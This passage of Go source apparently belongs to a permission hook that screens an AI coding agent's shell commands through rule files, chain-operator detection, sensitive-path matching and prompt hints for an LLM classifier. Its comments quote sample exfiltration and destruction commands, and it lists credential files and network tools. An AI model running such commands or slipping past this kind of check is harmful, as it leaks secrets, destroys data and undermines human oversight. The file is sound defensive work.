package yolonot

import (
	"bufio"
	"fmt"
	"os"
	"path"
	"path/filepath"
	"regexp"
	"strings"

	"github.com/sezaakgun/yolonot/internal/glob"
	"mvdan.cc/sh/v3/syntax"
)

type Rule struct {
	Action  string // allow, deny, ask
	Type    string // cmd, path
	Pattern string
	Message string // optional, shown to the AI via permissionDecisionReason
}

// Hint is a prose directive that gets injected into the LLM classifier's
// system prompt. Unlike Rule, hints are not pattern-matched — they are read
// verbatim by the model, the same way Claude Code's autoMode treats
// environment / allow / soft_deny entries.
//
// Type is one of:
//   - "context"     — describes trusted infrastructure (repos, buckets, domains)
//   - "allow-hint"  — nudges the classifier toward `allow` on routine patterns
//   - "ask-hint"    — nudges the classifier toward `ask` on environment-specific risks
//
// Hints stack across the .yolonot walk-up chain — every file's entries are
// concatenated in walk-up order (closest-to-cwd first), so a project's hints
// extend rather than override a parent's. There is no first-match semantics
// for hints; the LLM reads the union.
type Hint struct {
	Type string
	Text string
}

// WalkupHints groups hints by type as collected from the .yolonot walk-up
// chain. Returned by LoadHints; consumed by BuildSystemPrompt to assemble
// the system prompt sent to the classifier.
type WalkupHints struct {
	Context    []string
	AllowHints []string
	AskHints   []string
	// SystemPrompt is a full base-prompt override from a `system-prompt`
	// directive. Unlike the hint slices it does NOT stack — the first
	// (closest-to-cwd, most specific) non-empty override in the walk-up
	// chain wins; parents cannot re-override a child's base prompt.
	SystemPrompt string
}

type RuleMatch struct {
	Action  string
	Type    string
	Pattern string
	Message string
}

var scriptPathRe = regexp.MustCompile(`[\s]([^\s]+\.(py|sh|bash|zsh|js|mjs|cjs|ts|tsx|jsx|rb|pl|php|lua|go))(\s|$)`)

// LoadRules reads .yolonot rules from project dir (walking up from cwd)
// and global dir. Rules loaded first win on match, so order is:
//
//  1. cwd/.yolonot, parent/.yolonot, ..., up to the nearest ancestor
//     containing a .yolonot (closer = more specific = higher priority);
//  2. ~/.yolonot/rules (per-user directory form);
//  3. ~/.yolonot (per-user file form, if present).
func LoadRules(cwd ...string) []Rule {
	paths := yolonotConfigSearchPaths(cwd...)

	var rules []Rule
	for _, path := range paths {
		rules = append(rules, loadRulesFromFile(path)...)
	}
	return rules
}

// LoadHints reads classifier hints from the same .yolonot walk-up chain as
// LoadRules. Unlike rules, hints stack across every file in the chain — the
// LLM gets the union as part of its system prompt, with closer-to-cwd files
// listed first so per-project context appears before per-team or per-user.
func LoadHints(cwd ...string) WalkupHints {
	paths := yolonotConfigSearchPaths(cwd...)

	var out WalkupHints
	for _, path := range paths {
		for _, h := range loadHintsFromFile(path) {
			switch h.Type {
			case "context":
				out.Context = append(out.Context, h.Text)
			case "allow-hint":
				out.AllowHints = append(out.AllowHints, h.Text)
			case "ask-hint":
				out.AskHints = append(out.AskHints, h.Text)
			case "system-prompt":
				// First non-empty wins: paths are appended closest-to-cwd
				// first, so the most specific file's override sticks and
				// parents cannot clobber it. A full base prompt does not
				// stack the way sentence-sized hints do.
				if out.SystemPrompt == "" {
					out.SystemPrompt = h.Text
				}
			}
		}
	}
	return out
}

// loadHintsFromFile parses a single .yolonot file and returns any prose
// hints it declares. Format mirrors the rule format but the body is a
// quoted string instead of a glob pattern:
//
//	context     "trusted infra: github.com/yourorg/*, *.example.com"
//	allow-hint  "kubectl get on prod-* namespaces is read-only"
//	ask-hint    "never modify files under infra/terraform/prod/"
//
// Empty bodies and unquoted bodies are silently skipped — the parser is
// permissive on malformed lines for the same reason loadRulesFromFile is:
// shared rule files mix both kinds and an unfamiliar directive must not
// cause the whole file to fail to load.
func loadHintsFromFile(path string) []Hint {
	f, err := os.Open(path)
	if err != nil {
		return nil
	}
	defer f.Close()

	var hints []Hint
	scanner := bufio.NewScanner(f)
	lineNum := 0
	for scanner.Scan() {
		lineNum++
		line := strings.TrimSpace(scanner.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		parts := strings.SplitN(line, " ", 2)
		if len(parts) != 2 {
			continue
		}
		directive := parts[0]
		body := strings.TrimSpace(parts[1])
		switch directive {
		case "context", "allow-hint", "ask-hint", "system-prompt":
		default:
			continue
		}
		text := unquoteHintBody(body)
		if directive == "system-prompt" {
			// A full base prompt is inherently multi-line but the walk-up
			// format is one directive per line, so let a `\n` escape stand
			// in for a real newline here. Hint sentences never need this, so
			// the expansion is scoped to system-prompt to avoid surprising
			// context/allow/ask bodies that legitimately contain "\n".
			text = strings.ReplaceAll(text, `\n`, "\n")
		}
		if text == "" {
			// A recognized hint directive with an unparseable body is
			// almost always a quoting mistake (`allow-hint kubectl get
			// is fine` without quotes). Silent skip would mean "why is
			// my hint not working?" support volume; warn loudly with
			// path:line:directive so users can locate and fix it. Same
			// pattern as loadRulesFromFile's redirect warning.
			fmt.Fprintf(os.Stderr,
				"yolonot: %s:%d: %s body must be a double-quoted string; line ignored\n",
				path, lineNum, directive)
			continue
		}
		hints = append(hints, Hint{Type: directive, Text: text})
	}
	return hints
}

// unquoteHintBody strips the surrounding quotes from a hint body and
// resolves \" escapes. Returns "" if the body isn't a single quoted string.
// We deliberately don't tolerate unquoted bodies — prose is allowed to
// contain spaces, hashes, and other characters that would otherwise need
// shell-style escaping; quoting keeps the parser unambiguous.
func unquoteHintBody(s string) string {
	s = strings.TrimSpace(s)
	if len(s) < 2 || s[0] != '"' || s[len(s)-1] != '"' {
		return ""
	}
	inner := s[1 : len(s)-1]
	return strings.ReplaceAll(inner, `\"`, `"`)
}

// yolonotConfigSearchPaths returns the ordered list of .yolonot paths that
// config loaders should read. Shared by LoadRules and LoadSensitivePatterns
// so both observe the same walk-up hierarchy.
//
// Trust boundary: walk-up is scoped to the enclosing git repo root. A
// `.yolonot` outside the repo is NOT loaded automatically — otherwise an
// attacker-writable ancestor like `/tmp` or `~/Downloads` could silently
// inject rules (e.g. `allow-cmd *` or `allow-redirect *`) the moment
// Claude Code is launched under it. If cwd is not inside a git repo, no
// ancestor `.yolonot` is loaded — only the global config. Users who want
// "repo-less" walk-up can `git init` or place rules in ~/.yolonot/rules.
func yolonotConfigSearchPaths(directory ...string) []string {
	var paths []string

	cwd, err := os.Getwd()
	if len(directory) > 0 && directory[0] != "" {
		cwd, err = canonicalDirectory(directory[0]), nil
	}
	if err == nil {
		home, _ := os.UserHomeDir()
		if home != "" {
			home = canonicalDirectory(home)
		}
		cur := canonicalDirectory(cwd)
		repoRoot := findRepoRoot(cur) // empty string if not in a repo
		seen := map[string]bool{}
		addCandidate := func(dir string) {
			candidate := filepath.Join(dir, ".yolonot")
			// os.Lstat so we can reject symlinks: an attacker who earlier
			// got `ln -s` approved could point .yolonot at /tmp/evil-rules
			// (containing `allow-cmd *`) and laundry every later command.
			info, err := os.Lstat(candidate)
			if err == nil && !info.IsDir() && info.Mode()&os.ModeSymlink == 0 {
				paths = append(paths, candidate)
			}
		}

		for {
			if seen[cur] {
				break
			}
			seen[cur] = true
			if home != "" && cur == home {
				break
			}
			addCandidate(cur)
			if repoRoot == "" || cur == repoRoot {
				break
			}
			parent := filepath.Dir(cur)
			if parent == cur {
				break
			}
			cur = parent
		}

		if repoRoot != "" {
			walkBase := repoRoot
			if mainRoot := resolveWorktreeMainRoot(repoRoot); mainRoot != "" {
				if !seen[mainRoot] && (home == "" || mainRoot != home) {
					seen[mainRoot] = true
					addCandidate(mainRoot)
				}
				walkBase = mainRoot
			}
			if home != "" {
				anc := filepath.Dir(walkBase)
				for anc != walkBase && isStrictTrustedHomeSubdir(anc, home) {
					if seen[anc] {
						break
					}
					seen[anc] = true
					addCandidate(anc)
					walkBase = anc
					anc = filepath.Dir(walkBase)
				}
			}
		}
	}

	// Global rules directory — yolonot's own data dir.
	paths = append(paths, filepath.Join(YolonotDir(), "rules"))

	// Legacy: ~/.yolonot when used as a file instead of a directory.
	home, _ := os.UserHomeDir()
	globalFile := filepath.Join(home, ".yolonot")
	info, err := os.Stat(globalFile)
	if err == nil && !info.IsDir() {
		canonGlobal := canonicalDirectory(globalFile)
		// Avoid duplicating if we already loaded it during the walk-up.
		alreadyLoaded := false
		for _, p := range paths {
			if p == globalFile || canonicalDirectory(p) == canonGlobal {
				alreadyLoaded = true
				break
			}
		}
		if !alreadyLoaded {
			paths = append(paths, globalFile)
		}
	}

	return paths
}

// isStrictTrustedHomeSubdir reports whether dir is strictly under home (not
// home itself and not outside home) and not inside an untrusted download/temp
// subtree under home.
func isStrictTrustedHomeSubdir(dir, home string) bool {
	if dir == "" || home == "" {
		return false
	}
	rel, err := filepath.Rel(home, dir)
	if err != nil || rel == "." || rel == ".." || strings.HasPrefix(rel, ".."+string(filepath.Separator)) {
		return false
	}
	top := strings.SplitN(rel, string(filepath.Separator), 2)[0]
	switch strings.ToLower(top) {
	case "downloads", "tmp", "temp", "untrusted":
		return false
	}
	return true
}

// resolveWorktreeMainRoot returns the main repository root when repoRoot is a
// linked git worktree (where .git is a file pointing at <main>/.git/worktrees/<name>),
// or "" if repoRoot is a normal repository or not a worktree.
func resolveWorktreeMainRoot(repoRoot string) string {
	if repoRoot == "" {
		return ""
	}
	dotGit := filepath.Join(repoRoot, ".git")
	info, err := os.Lstat(dotGit)
	if err != nil || info.IsDir() || info.Mode()&os.ModeSymlink != 0 {
		return ""
	}
	data, err := os.ReadFile(dotGit)
	if err != nil {
		return ""
	}
	line := strings.TrimSpace(string(data))
	if !strings.HasPrefix(line, "gitdir:") {
		return ""
	}
	gitdir := strings.TrimSpace(strings.TrimPrefix(line, "gitdir:"))
	if gitdir == "" {
		return ""
	}
	if !filepath.IsAbs(gitdir) {
		gitdir = filepath.Join(repoRoot, gitdir)
	}
	gitdir = filepath.Clean(gitdir)

	worktreesDir := filepath.Dir(gitdir)
	mainDotGit := filepath.Dir(worktreesDir)
	if filepath.Base(worktreesDir) == "worktrees" && filepath.Base(mainDotGit) == ".git" {
		mainRoot := filepath.Dir(mainDotGit)
		if st, err := os.Stat(mainDotGit); err == nil && st.IsDir() {
			return canonicalDirectory(mainRoot)
		}
	}
	return ""
}

// findRepoRoot walks up from start looking for a `.git` entry (directory
// or file — Git worktrees and submodules use a file form). Returns the
// containing directory, or "" if cwd is not inside a git repo.
func findRepoRoot(start string) string {
	cur := start
	// Cap walk depth: an attacker-controlled deep `cwd` (set via the hook
	// payload) would otherwise DoS each hook call with thousands of
	// os.Stat() lookups, tripping the hook timeout and failing-open to the
	// host's native permission layer.
	const maxDepth = 64
	for i := 0; i < maxDepth; i++ {
		if _, err := os.Stat(filepath.Join(cur, ".git")); err == nil {
			return cur
		}
		parent := filepath.Dir(cur)
		if parent == cur {
			return ""
		}
		cur = parent
	}
	return ""
}

func loadRulesFromFile(path string) []Rule {
	f, err := os.Open(path)
	if err != nil {
		return nil
	}
	defer f.Close()

	var rules []Rule
	scanner := bufio.NewScanner(f)
	lineNum := 0
	for scanner.Scan() {
		lineNum++
		line := strings.TrimSpace(scanner.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		parts := strings.SplitN(line, " ", 2)
		if len(parts) != 2 {
			continue
		}
		actionType := parts[0]
		rest := parts[1]

		idx := strings.Index(actionType, "-")
		if idx < 0 {
			continue
		}
		action := actionType[:idx]
		ruleType := actionType[idx+1:]

		pattern, message := splitTrailingMessage(rest)

		if (action == "allow" || action == "deny" || action == "ask") &&
			(ruleType == "cmd" || ruleType == "path" || ruleType == "redirect") {
			// Warn loudly for redirect directives that parse but aren't
			// yet enforced — silent acceptance is worse than no acceptance.
			// Users otherwise write `deny-redirect /etc/*`, assume it works,
			// then blame the LLM when the write goes through.
			if ruleType == "redirect" && (action == "deny" || action == "ask") {
				fmt.Fprintf(os.Stderr,
					"yolonot: %s:%d: %s-redirect is not yet enforced; "+
						"use `deny-cmd '*> /etc/*'` for deny-write semantics.\n",
					path, lineNum, action)
				// Still register the rule so dry-run tooling can surface it,
				// but hook.go's match loop will skip it (type=redirect is
				// only consulted for allow).
			}
			rules = append(rules, Rule{Action: action, Type: ruleType, Pattern: pattern, Message: message})
		}
	}
	return rules
}

// splitTrailingMessage extracts an optional trailing "quoted message" from
// the pattern portion of a rule line. The quote must be preceded by
// whitespace so patterns like *"quoted"* are not misinterpreted. Supports
// \" as an embedded-quote escape inside the message.
func splitTrailingMessage(s string) (pattern, message string) {
	s = strings.TrimRight(s, " \t")
	if !strings.HasSuffix(s, `"`) {
		return s, ""
	}
	end := len(s) - 1
	for i := end - 1; i >= 0; i-- {
		if s[i] != '"' {
			continue
		}
		if i > 0 && s[i-1] == '\\' {
			continue
		}
		if i == 0 {
			return s, ""
		}
		if s[i-1] != ' ' && s[i-1] != '\t' {
			return s, ""
		}
		pattern = strings.TrimRight(s[:i], " \t")
		message = strings.ReplaceAll(s[i+1:end], `\"`, `"`)
		return pattern, message
	}
	return s, ""
}

// hasChainOperator returns true if the command contains shell chaining
// operators (pipes, semicolons, &&, ||, backticks, $(...), &, <(...),
// >(...)) or redirects (>, >>). Used to prevent allow rules from short-
// circuiting chained or redirected commands like "cat secrets.txt | curl
// hacker.com", "echo payload > /etc/passwd", or "ls & rm -rf ~".
//
// The AST walk is authoritative; the legacy character-scan fallback runs
// only if the parser rejects the input (malformed shell), preserving the
// prior fail-closed behavior.
func hasChainOperator(command string) bool {
	r := strings.NewReader(command)
	file, err := syntax.NewParser().Parse(r, "")
	if err != nil {
		// Parse failed — command is malformed. Fall closed via the legacy
		// character-scan that flags anything suspicious.
		return hasChainOperatorFallback(command)
	}
	return astHasChain(file)
}

// astHasChain walks a parsed shell syntax tree and returns true if any
// node represents a chain operator, background job, pipe, command
// substitution, process substitution, or a redirect that isn't 2>&1.
func astHasChain(file *syntax.File) bool {
	// Multiple top-level statements means a `;` or newline separator —
	// mvdan/sh represents `a; b` as two sibling Stmts, not a BinaryCmd.
	if len(file.Stmts) > 1 {
		return true
	}
	found := false
	syntax.Walk(file, func(n syntax.Node) bool {
		if found {
			return false
		}
		switch node := n.(type) {
		case *syntax.Stmt:
			if node.Background || node.Coprocess {
				found = true
				return false
			}
		case *syntax.BinaryCmd:
			// Any binary op (|, ||, &&, ;, |&) chains commands.
			found = true
			return false
		case *syntax.CmdSubst:
			// $(...), <(...), >(...), `...`.
			found = true
			return false
		case *syntax.Redirect:
			// Allow only the harmless 2>&1 idiom. Everything else is a
			// potential data-exfil or write vector.
			if node.Op == syntax.DplOut && node.N != nil && node.N.Value == "2" {
				if w := node.Word; w != nil && len(w.Parts) == 1 {
					if lit, ok := w.Parts[0].(*syntax.Lit); ok && lit.Value == "1" {
						return true
					}
				}
			}
			found = true
			return false
		}
		return true
	})
	return found
}

// hasChainOperatorFallback is the legacy character scan. Used only when
// the shell parser fails (malformed input) — we want to fail closed then.
func hasChainOperatorFallback(command string) bool {
	for i := 0; i < len(command); i++ {
		switch command[i] {
		case '|', ';', '`':
			return true
		case '&':
			// Any `&` — either `&&` chain or backgrounded job (`cmd &`).
			return true
		case '$':
			if i+1 < len(command) && command[i+1] == '(' {
				return true
			}
		case '<':
			if i+1 < len(command) && command[i+1] == '(' {
				return true
			}
		case '>':
			if i+1 < len(command) && command[i+1] == '(' {
				return true
			}
			// Redirect: > or >> but not 2>&1.
			if i > 0 && command[i-1] == '2' {
				rest := command[i+1:]
				if strings.HasPrefix(rest, "&1") || strings.HasPrefix(rest, ">&1") {
					continue
				}
			}
			return true
		}
	}
	return false
}

// allSensitivePatterns is the full list of known sensitive file patterns.
// Used by tests and as a reference. Not loaded by default — users opt-in
// by uncommenting "sensitive <pattern>" lines in their .yolonot files.
var allSensitivePatterns = []string{
	".env", ".pem", ".key", ".crt", ".p12", ".pfx", ".jks",
	".ssh/", ".aws/", ".gnupg/", ".kube/config",
	"credentials", "secrets", "password", "token",
	"/etc/shadow", "/etc/passwd", "/etc/sudoers",
	"id_rsa", "id_ed25519", "id_ecdsa",
	".netrc", ".pgpass", ".my.cnf",
}

// LoadSensitivePatterns returns the active sensitive patterns from .yolonot
// rule files. Only explicitly added "sensitive <pattern>" directives are
// active — nothing is enabled by default.
func LoadSensitivePatterns(cwd ...string) []string {
	paths := yolonotConfigSearchPaths(cwd...)

	var adds []string
	removes := map[string]bool{}

	for _, path := range paths {
		a, r := loadSensitiveFromFile(path)
		adds = append(adds, a...)
		for _, pat := range r {
			removes[pat] = true
		}
	}

	// Only explicitly added patterns are active
	seen := map[string]bool{}
	var result []string
	for _, pat := range adds {
		if !removes[pat] && !seen[pat] {
			result = append(result, pat)
			seen[pat] = true
		}
	}
	return result
}

// loadSensitiveFromFile parses "sensitive" and "not-sensitive" directives.
func loadSensitiveFromFile(path string) (adds []string, removes []string) {
	f, err := os.Open(path)
	if err != nil {
		return
	}
	defer f.Close()

	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		parts := strings.SplitN(line, " ", 2)
		if len(parts) != 2 {
			continue
		}
		switch parts[0] {
		case "sensitive":
			adds = append(adds, parts[1])
		case "not-sensitive":
			removes = append(removes, parts[1])
		}
	}
	return
}

// hasSensitivePathWith checks against a specific pattern list.
func hasSensitivePathWith(command string, patterns []string) bool {
	return len(matchedSensitivePatterns(command, patterns)) > 0
}

// matchedSensitivePatterns returns the subset of patterns matched by command.
// It inspects both the unquoted command text and parsed shell words/globs so
// quote-splitting (`cat .e""nv`), backslash escapes (`cat .e\nv`), inline
// echo/printf command substitutions (`cat $(printf .en)v`), and shell globs
// (`cat .e?v`, `cat *.pem`) cannot slip past, while avoiding prefix false
// positives like `echo .environment` for `.env`.
func matchedSensitivePatterns(command string, patterns []string) []string {
	if len(patterns) == 0 || strings.TrimSpace(command) == "" {
		return nil
	}
	candidates, globs := extractSensitiveCandidates(command)
	var matched []string
	seen := map[string]bool{}
	for _, rawPat := range patterns {
		pat := normalizeSensitiveMatchPattern(rawPat)
		if pat == "" || seen[rawPat] {
			continue
		}
		if sensitivePatternMatches(pat, candidates, globs) {
			matched = append(matched, rawPat)
			seen[rawPat] = true
		}
	}
	return matched
}

func normalizeSensitiveMatchPattern(raw string) string {
	p := strings.ToLower(strings.TrimSpace(raw))
	p = strings.TrimPrefix(p, "~/")
	p = strings.TrimPrefix(p, "**/")
	p = strings.TrimPrefix(p, "./")
	p = strings.TrimLeft(p, "*")
	p = strings.TrimSuffix(p, "/**")
	p = strings.TrimRight(p, "*")
	if p == "" || p == "." || p == "/" {
		return ""
	}
	return p
}

func extractSensitiveCandidates(command string) (candidates []string, globs []string) {
	candidates = append(candidates, strings.ToLower(unquoteShellText(command)))
	file, err := syntax.NewParser().Parse(strings.NewReader(command), "")
	if err != nil {
		return candidates, nil
	}
	var wordTexts []string
	syntax.Walk(file, func(node syntax.Node) bool {
		w, ok := node.(*syntax.Word)
		if !ok {
			return true
		}
		lit, hasWild := sensitiveWordText(w)
		if lit != "" {
			lower := strings.ToLower(lit)
			candidates = append(candidates, lower)
			wordTexts = append(wordTexts, lower)
			if hasWild {
				globs = append(globs, lower)
			}
		}
		return true
	})
	if len(wordTexts) > 0 {
		candidates = append(candidates, strings.Join(wordTexts, " "))
	}
	return candidates, globs
}

func sensitiveWordText(w *syntax.Word) (string, bool) {
	if w == nil {
		return "", false
	}
	var b strings.Builder
	hasWild := false
	for _, part := range w.Parts {
		switch p := part.(type) {
		case *syntax.Lit:
			val := unescapeShellLit(p.Value)
			if strings.ContainsAny(p.Value, "*?[") {
				hasWild = true
			}
			b.WriteString(val)
		case *syntax.SglQuoted:
			b.WriteString(p.Value)
		case *syntax.DblQuoted:
			for _, dp := range p.Parts {
				switch inner := dp.(type) {
				case *syntax.Lit:
					b.WriteString(unescapeShellLit(inner.Value))
				case *syntax.CmdSubst:
					b.WriteString(literalCmdSubstOutput(inner))
				}
			}
		case *syntax.CmdSubst:
			b.WriteString(literalCmdSubstOutput(p))
		}
	}
	return b.String(), hasWild
}

func literalCmdSubstOutput(cs *syntax.CmdSubst) string {
	if cs == nil || len(cs.Stmts) != 1 || cs.Stmts[0].Cmd == nil {
		return ""
	}
	call, ok := cs.Stmts[0].Cmd.(*syntax.CallExpr)
	if !ok || len(call.Args) < 2 {
		return ""
	}
	head, _ := sensitiveWordText(call.Args[0])
	switch filepath.Base(head) {
	case "printf", "echo":
		var out strings.Builder
		for _, arg := range call.Args[1:] {
			s, _ := sensitiveWordText(arg)
			if strings.HasPrefix(s, "-") {
				continue
			}
			out.WriteString(s)
		}
		return out.String()
	}
	return ""
}

func unescapeShellLit(s string) string {
	if !strings.Contains(s, `\`) {
		return s
	}
	var b strings.Builder
	for i := 0; i < len(s); i++ {
		if s[i] == '\\' && i+1 < len(s) {
			i++
		}
		b.WriteByte(s[i])
	}
	return b.String()
}

func unquoteShellText(s string) string {
	var b strings.Builder
	inSingle, inDouble := false, false
	for i := 0; i < len(s); i++ {
		c := s[i]
		if c == '\\' && !inSingle && i+1 < len(s) {
			i++
			b.WriteByte(s[i])
			continue
		}
		if c == '\'' && !inDouble {
			inSingle = !inSingle
			continue
		}
		if c == '"' && !inSingle {
			inDouble = !inDouble
			continue
		}
		b.WriteByte(c)
	}
	return b.String()
}

func sensitivePatternMatches(pat string, candidates []string, globs []string) bool {
	for _, c := range candidates {
		if containsBoundedSensitive(c, pat) {
			return true
		}
	}
	cleanPat := strings.TrimSuffix(pat, "/")
	patBase := filepath.Base(cleanPat)
	if patBase == "" || patBase == "." {
		return false
	}
	isDirPat := strings.HasSuffix(pat, "/")
	patSegs := strings.Split(cleanPat, "/")
	for _, g := range globs {
		cleanGlob := strings.TrimSuffix(g, "/")
		if isDirPat {
			for _, seg := range strings.Split(cleanGlob, "/") {
				if sensitiveGlobSegMatches(seg, patBase) {
					return true
				}
			}
			continue
		}
		if len(patSegs) > 1 {
			gSegs := strings.Split(cleanGlob, "/")
			if len(gSegs) < len(patSegs) {
				continue
			}
			tail := gSegs[len(gSegs)-len(patSegs):]
			allMatch := true
			for i := range patSegs {
				if !sensitiveGlobSegMatches(tail[i], patSegs[i]) && tail[i] != patSegs[i] {
					allMatch = false
					break
				}
			}
			if allMatch {
				return true
			}
			continue
		}
		gBase := filepath.Base(cleanGlob)
		if sensitiveGlobSegMatches(gBase, patBase) {
			return true
		}
	}
	return false
}

func sensitiveGlobSegMatches(gSeg, patSeg string) bool {
	// Require at least one non-wildcard literal character in the glob segment so
	// generic globs like `ls src/*` or `rm -rf /tmp/*` don't trigger on `.env`.
	if strings.Trim(gSeg, "*?[]") == "" {
		return false
	}
	if glob.Match(gSeg, patSeg) || (strings.HasPrefix(patSeg, ".") && glob.Match(gSeg, "file"+patSeg)) {
		return true
	}
	if m, err := path.Match(gSeg, patSeg); err == nil && m {
		return true
	}
	if strings.HasPrefix(patSeg, ".") {
		if m, err := path.Match(gSeg, "file"+patSeg); err == nil && m {
			return true
		}
	}
	return false
}

func containsBoundedSensitive(s, pat string) bool {
	if pat == "" {
		return false
	}
	checkLeft := isASCIIAlphaNum(pat[0])
	checkRight := isASCIIAlphaNum(pat[len(pat)-1])
	offset := 0
	for {
		idx := strings.Index(s[offset:], pat)
		if idx < 0 {
			return false
		}
		pos := offset + idx
		end := pos + len(pat)
		leftOK := !checkLeft || pos == 0 || !isASCIIAlphaNum(s[pos-1])
		rightOK := !checkRight || end == len(s) || !isASCIIAlphaNum(s[end])
		if leftOK && rightOK {
			return true
		}
		offset = pos + 1
	}
}

func isASCIIAlphaNum(b byte) bool {
	return (b >= 'a' && b <= 'z') || (b >= 'A' && b <= 'Z') || (b >= '0' && b <= '9')
}

// AllowRedirectPatterns returns patterns from `allow-redirect <glob>` rules.
// Used by the fast-allow path to permit writes to user-declared-safe
// paths (e.g., ./dist/*, /tmp/build/*).
func AllowRedirectPatterns(rules []Rule) []string {
	var out []string
	for _, r := range rules {
		if r.Type == "redirect" && r.Action == "allow" {
			out = append(out, r.Pattern)
		}
	}
	return out
}

// MatchRule checks a command against rules. Returns first match or nil.
// Allow rules are skipped when the command contains chain operators,
// redirects, or references sensitive file paths — the LLM evaluates instead.
// Deny/ask rules always apply regardless.
func MatchRule(command string, rules []Rule) *RuleMatch {
	return MatchRuleWith(command, rules, LoadSensitivePatterns())
}

// MatchRuleByPriority picks the highest-priority rule match (deny > ask > allow)
// regardless of rule file order. Used at step 0 of the hook pipeline where user
// rules are authoritative — a deny-cmd always beats an overlapping allow-cmd,
// an ask-cmd always beats an overlapping allow-cmd, and file order is irrelevant.
// MatchRuleWith (first-match-wins) is still used where needed.
func extractScriptPath(command string) string {
	masked := blankCodeQuotes(command)
	if m := scriptPathRe.FindStringSubmatch(" " + masked); len(m) > 1 {
		return strings.Trim(m[1], `"'`)
	}
	if m := scriptPathRe.FindStringSubmatch(" " + unquoteShellText(masked)); len(m) > 1 {
		return strings.Trim(m[1], `"'`)
	}
	return ""
}

// isNonExecutingScriptCommand returns true when a command clearly treats a
// script path as a file/text/network operand or runs inline code (-c/-e/--eval)
// rather than executing the script file itself. Used to prevent `allow-path`
// from auto-allowing destructive or arbitrary commands that merely mention a
// script path, while preserving test runners and wrappers like `pytest`, `jest`,
// `uv run pytest`, `npx tsx`, etc.
func isNonExecutingScriptCommand(command, scriptPath string) bool {
	if scriptPath == "" {
		return true
	}
	nonRunners := map[string]bool{
		"rm": true, "mv": true, "cp": true, "cat": true, "head": true, "tail": true,
		"less": true, "more": true, "grep": true, "rg": true, "sed": true, "awk": true,
		"chmod": true, "chown": true, "chgrp": true, "ln": true, "touch": true,
		"truncate": true, "dd": true, "tee": true, "curl": true, "wget": true,
		"scp": true, "rsync": true, "sftp": true, "nc": true, "ncat": true,
		"git": true, "tar": true, "zip": true, "unzip": true, "gzip": true,
		"find": true, "xargs": true, "echo": true, "printf": true, "ls": true,
		"stat": true, "wc": true, "diff": true, "patch": true, "install": true,
	}
	inlineFlags := map[string]bool{
		"-c": true, "-e": true, "--eval": true, "-p": true, "--print": true,
	}
	prefixes := map[string]bool{"sudo": true, "env": true, "nice": true, "nohup": true, "time": true, "command": true, "exec": true}
	fields := strings.Fields(unquoteShellText(blankCodeQuotes(command)))
	for len(fields) > 0 && (strings.Contains(fields[0], "=") || prefixes[filepath.Base(fields[0])] || strings.HasPrefix(fields[0], "-")) {
		fields = fields[1:]
	}
	if len(fields) == 0 {
		return true
	}
	head := filepath.Base(fields[0])
	if nonRunners[head] {
		return true
	}
	for _, tok := range fields[1:] {
		if inlineFlags[tok] {
			return true
		}
	}
	return false
}

// RuleEvalTrace captures the full rule evaluation state for a command,
// shared between the live hook (MatchRuleByPriority) and `yolonot check`.
type RuleEvalTrace struct {
	DenyMatch      *RuleMatch
	AskMatch       *RuleMatch
	AllowCandidate *RuleMatch
	Chains         bool
	Sensitive      bool
	SkipAllow      bool
	Match          *RuleMatch
}

func matchesRule(r Rule, command, scriptPath string) bool {
	switch r.Type {
	case "cmd":
		return matchCmd(r.Pattern, command)
	case "path":
		if scriptPath == "" || !glob.Match(r.Pattern, scriptPath) {
			return false
		}
		if r.Action == "allow" && isNonExecutingScriptCommand(command, scriptPath) {
			return false
		}
		return true
	}
	return false
}

// EvaluateRulePriority evaluates all rules against command in priority order
// (deny > ask > allow) and records whether allow rules were skipped due to
// chain operators or sensitive paths.
func EvaluateRulePriority(command string, rules []Rule, sensitive []string) RuleEvalTrace {
	chains := hasChainOperator(command)
	sens := hasSensitivePathWith(command, sensitive)
	skipAllow := chains || sens
	scriptPath := extractScriptPath(command)

	trace := RuleEvalTrace{
		Chains:    chains,
		Sensitive: sens,
		SkipAllow: skipAllow,
	}
	for _, r := range rules {
		if !matchesRule(r, command, scriptPath) {
			continue
		}
		m := &RuleMatch{Action: r.Action, Type: r.Type, Pattern: r.Pattern, Message: r.Message}
		switch r.Action {
		case "deny":
			if trace.DenyMatch == nil {
				trace.DenyMatch = m
			}
		case "ask":
			if trace.AskMatch == nil {
				trace.AskMatch = m
			}
		case "allow":
			if trace.AllowCandidate == nil {
				trace.AllowCandidate = m
			}
		}
	}
	switch {
	case trace.DenyMatch != nil:
		trace.Match = trace.DenyMatch
	case trace.AskMatch != nil:
		trace.Match = trace.AskMatch
	case !skipAllow && trace.AllowCandidate != nil:
		trace.Match = trace.AllowCandidate
	}
	return trace
}

func MatchRuleByPriority(command string, rules []Rule, sensitive []string) *RuleMatch {
	return EvaluateRulePriority(command, rules, sensitive).Match
}

// MatchRuleWith is like MatchRule but accepts pre-loaded sensitive patterns.
func MatchRuleWith(command string, rules []Rule, sensitive []string) *RuleMatch {
	skipAllow := hasChainOperator(command) || hasSensitivePathWith(command, sensitive)
	scriptPath := extractScriptPath(command)

	for _, r := range rules {
		if skipAllow && r.Action == "allow" {
			continue
		}
		if matchesRule(r, command, scriptPath) {
			return &RuleMatch{Action: r.Action, Type: r.Type, Pattern: r.Pattern, Message: r.Message}
		}
	}
	return nil
}

// matchCmd matches a cmd rule pattern against a command.
// Patterns starting with * (like *curl *) verify the command word appears
// as an actual executable (first token or after sudo/env prefixes), not just
// in arguments like echo "curl example.com".
func matchCmd(pattern, fullCommand string) bool {
	if !glob.Match(pattern, fullCommand) && !(strings.HasSuffix(pattern, " *") && glob.Match(strings.TrimSuffix(pattern, " *"), strings.TrimSpace(fullCommand))) {
		return false
	}

	// Pattern doesn't start with * — anchored to start, no false positives
	if !strings.HasPrefix(pattern, "*") {
		return true
	}

	// Pattern starts with * — verify the command word is an actual executable
	cmdWord := extractCmdWord(pattern)
	if cmdWord == "" {
		return true
	}
	if strings.Contains(cmdWord, "/") {
		return matchLeadingWildcardPath(pattern, fullCommand)
	}

	// Check executables in each segment (split by chain operators)
	for _, seg := range splitSegments(fullCommand) {
		for _, exe := range extractExecutables(seg) {
			if exe == cmdWord {
				return true
			}
		}
	}
	return false
}

func matchLeadingWildcardPath(pattern, fullCommand string) bool {
	pathPat := pattern
